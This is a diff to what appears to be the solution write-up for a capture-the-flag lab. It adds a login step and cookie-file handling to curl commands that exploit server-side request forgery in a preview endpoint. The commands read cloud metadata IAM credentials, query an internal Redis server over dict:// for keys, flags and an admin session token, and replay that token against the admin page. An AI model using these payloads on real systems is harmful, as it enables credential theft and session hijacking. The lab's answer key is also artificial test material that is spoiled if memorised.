@@ -44,12 +44,20 @@
 
 ### Exploit
 
+First, log in and save the session cookie to a file (used by all subsequent steps):
+
+```bash
+curl -c cookies.txt -X POST http://localhost:5180/login \
+  -d "username=abcd12&password=36fea3f062c" \
+  -L
+```
+
 Step 1: Fetch the metadata directory listing.
 
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
 ```
 
@@ -65,7 +73,7 @@ Step 2: Fetch the IAM credentials.
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/veridian-prod-role"}'
 ```
 
@@ -100,7 +108,7 @@ Response:
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "http://169.254.169.254/latest/user-data"}'
 ```
 
@@ -150,7 +158,7 @@ Step 1: Confirm Redis is reachable.
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "dict://redis:6379/INFO server"}'
 ```
 
@@ -161,7 +169,7 @@ Step 2: Enumerate Redis keys.
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "dict://redis:6379/KEYS *"}'
 ```
 
@@ -177,7 +185,7 @@ Step 3: Retrieve Flag 3.
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "dict://redis:6379/GET veridian:flag3"}'
 ```
 
@@ -200,7 +208,7 @@ Step 1: Retrieve the admin session token from Redis.
 ```bash
 curl -X POST http://localhost:5180/api/preview \
   -H "Content-Type: application/json" \
-  -b "<session_cookie>" \
+  -b cookies.txt \
   -d '{"url": "dict://redis:6379/GET veridian:session:admin"}'
 ```
 
@@ -214,7 +222,7 @@ Step 2: Access the admin dashboard. The player must also be logged in (session c
 ```bash
 curl http://localhost:5180/admin \
   -H "X-Session-Token: vsec-admin-sess-a1b2c3d4e5f6" \
-  -b "<session_cookie>"
+  -b cookies.txt
 ```
 
 Response: The admin dashboard HTML containing the classified incident report and Flag 4.
